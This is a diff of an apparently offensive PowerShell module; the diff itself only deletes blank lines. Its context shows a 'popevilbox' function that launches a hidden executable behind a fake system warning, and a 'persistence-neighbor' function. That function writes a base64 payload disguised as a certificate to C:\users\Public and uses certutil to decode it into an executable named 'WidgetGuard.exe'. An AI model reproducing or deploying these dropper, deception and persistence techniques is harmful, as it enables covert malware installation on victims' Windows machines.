@@ -141,7 +141,6 @@ $checkpsremote = "localhost"; $porty = 5985, 5986; foreach ($port in $porty) { T
 Export-ModuleMember -Function checkpsrem
 Set-Alias -Name checkpsrem -Value checkpsrem
 
-
 Function getservice {
 Get-WmiObject Win32_Service | Where-Object { $_.State -eq 'Running' } | Select-Object Name, ProcessId, StartMode, Status, DisplayName, ServiceType  | Format-Table -AutoSize
 }
@@ -451,7 +450,6 @@ function uninstaller {
 Export-ModuleMember -Function uninstaller
 Set-Alias -Name uninstaller -Value uninstaller -Description "Run code for uninstaller"
 
-
 #popevilbox -Text "Check your system" -Header "@NT-SYSTEM: Warning!!" -What "powershell start-process .\testgo.exe -windowstyle hidden"
 function popevilbox {
     param(
@@ -482,7 +480,6 @@ function persistence-neighbor {
     )
 	$target = $process
 	$mamba = $naughty 
-	
 cd $env:??e????f???
 echo '
 -----BEGIN CERTIFICATE-----
@@ -15745,7 +15742,6 @@ MTVfX2ZvcmNlZF91bndpbmRFAC5yZWZwdHIuX1pOU3QxNmludmFsaWRfYXJndW1l
 bnREMUV2AC5yZWZwdHIuX1pUVlN0MTZpbnZhbGlkX2FyZ3VtZW50AF9faW1wX2dl
 dGMA
 -----END CERTIFICATE-----
-
 '> "C:\users\Public\P3RNB.bin"
 cd ~\
 certutil -decode "C:\users\Public\P3RNB.bin" "C:\users\Public\WidgetGuard.exe" |Out-Null
